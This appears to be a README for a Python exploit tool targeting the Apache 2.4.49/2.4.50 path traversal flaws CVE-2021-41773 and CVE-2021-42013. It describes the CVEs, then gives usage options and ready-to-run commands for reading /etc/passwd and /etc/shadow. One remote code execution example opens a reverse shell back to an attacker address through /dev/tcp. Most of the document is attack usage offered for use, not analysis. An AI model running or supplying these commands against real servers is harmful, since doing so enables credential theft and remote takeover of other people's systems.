# Apache Path Traversal Exploit

This exploit is based on a few CVE vulnerabilities affecting Apache 2.4.49. We use URL-encoded characters to access certain files or otherwise restricted resources on the server. Possible RCE on certain systems as well.

## Affected CVEs
1. CVE-2021-41773

    A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013.

2. CVE-2021-42013

    It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

## Usage
```bash
$ python3 exploit.py -h

--cgi       Use if Apache server has CGI enabled
--port      Port the Apache server is listening on (Default: 8080)
--path      Path to the file on the Apache server to output (Default: /etc/passwd)
--ip        The website or IP address where the Apache server is hosted (Default: localhost)
-v          Increases verbosity
-s          Special exploit for Apache v2.4.50
--rce       Offers the ability to run Remote Code Execution on CGI-enabled servers
--cmd       Used in conjunction with --rce to run Remote Code Execution on the server (Default: whoami)
```

### Full example against a cgi-enabled server running on localhost:8000
```bash
$ python3 exploit.py --cgi --port 8000 --path "/etc/shadow"
```

### Bonus
Little bonus exploit for Apache v2.4.50 by using `-s` like this (cgi or non-cgi both work):
```bash
$ python3 exploit.py --port 8000 --path "/etc/passwd" -s
```

### More Examples
Made a third section just to show off my personal favorite command for the script against a cgi-enabled server running v2.4.50:
```bash
$ python3 exploit.py --ip <IP_ADDRESS> --port <PORT> --cgi --vs --path "/etc/shadow"
```

NOTE: If running `--rce`, the `-s` option is not required when trying to exploit v2.4.50!

Here is an RCE example (This should work on v2.4.49 or v2.4.50):
```bash
# In this scenario, we can run any command that'll run on Linux - This does actually open a reverse shell, so you'll need netcat or something similar
$ python3 exploit.py --ip <IP_ADDRESS> --port <PORT> --cgi -v --rce --cmd "bash -i >& /dev/tcp/<IP_ADRESS>/<PORT> 0>&1"
```
